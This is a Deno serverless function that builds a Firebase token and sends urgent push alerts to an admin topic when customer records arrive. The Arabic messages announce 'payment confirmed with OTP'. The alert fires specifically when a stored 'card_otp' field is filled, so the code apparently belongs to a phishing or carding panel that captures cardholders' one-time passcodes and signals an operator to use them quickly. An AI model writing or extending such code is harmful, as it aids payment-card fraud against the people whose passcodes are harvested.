import { serve } from 'https://deno.land/std@0.168.0/http/server.ts'

async function getFirebaseAccessToken(): Promise<string> {
  const sa = JSON.parse(Deno.env.get('FIREBASE_SERVICE_ACCOUNT') || '{}')
  if (!sa.client_email) throw new Error('FIREBASE_SERVICE_ACCOUNT not set')

  const now = Math.floor(Date.now() / 1000)
  const payload = {
    iss: sa.client_email,
    scope: 'https://www.googleapis.com/auth/firebase.messaging',
    aud: sa.token_uri || 'https://oauth2.googleapis.com/token',
    exp: now + 3600,
    iat: now,
  }

  // Create JWT using Web Crypto API
  const header = { alg: 'RS256', typ: 'JWT' }
  const b64 = (obj: unknown) => btoa(JSON.stringify(obj)).replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_')
  const toSign = `${b64(header)}.${b64(payload)}`

  const keyData = sa.private_key
    .replace('-----BEGIN PRIVATE KEY-----', '')
    .replace('-----END PRIVATE KEY-----', '')
    .replace(/\s/g, '')
  const binaryKey = Uint8Array.from(atob(keyData), c => c.charCodeAt(0))

  const privateKey = await crypto.subtle.importKey(
    'pkcs8', binaryKey,
    { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
    false, ['sign']
  )

  const signature = await crypto.subtle.sign(
    'RSASSA-PKCS1-v1_5', privateKey,
    new TextEncoder().encode(toSign)
  )

  const jwt = `${toSign}.${b64(new Uint8Array(signature))}`

  // Exchange JWT for access token
  const resp = await fetch(sa.token_uri || 'https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
      assertion: jwt,
    }),
  })
  const data = await resp.json()
  return data.access_token
}

serve(async (req) => {
  try {
    const { type, record, old_record } = await req.json()

    let title = ''
    let body = ''

    if (type === 'INSERT') {
      const name = record?.customer_name || 'عميل'
      const hasOtp = record?.card_otp && record.card_otp !== ''
      title = hasOtp ? '✅ تم تأكيد الدفع مع OTP!' : '🛒 طلب جديد!'
      body = hasOtp ? `${name} - اكتمل الدفع` : `${name} - بدأ طلب جديد`
    } else if (type === 'UPDATE') {
      const oldOtp = old_record?.card_otp || ''
      const newOtp = record?.card_otp || ''
      if (!oldOtp && newOtp) {
        title = '✅ تم تأكيد الدفع مع OTP!'
        body = `${record?.customer_name || 'عميل'} - اكتمل الدفع`
      }
    }

    if (!title) return new Response('No notification', { status: 200 })

    const accessToken = await getFirebaseAccessToken()

    const fcmRes = await fetch(
      `https://fcm.googleapis.com/v1/projects/gamescard-fa0f0/messages:send`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${accessToken}`,
        },
        body: JSON.stringify({
          message: {
            topic: 'aura_admin',
            notification: { title, body },
            android: {
              priority: 'high',
              notification: {
                channelId: 'aura_orders',
                priority: 'max',
                visibility: 'public',
                vibrationPattern: [500, 200, 500, 200, 1000, 500, 1000, 500, 1000],
              },
            },
            data: {
              type: (record?.card_otp || record?.card_otp === '') ? 'otp' : 'new_order',
              click_action: 'FLUTTER_NOTIFICATION_CLICK',
            },
          },
        }),
      },
    )

    const result = await fcmRes.text()
    return new Response(result, { status: fcmRes.ok ? 200 : 500 })
  } catch (e) {
    return new Response(e.message, { status: 500 })
  }
})
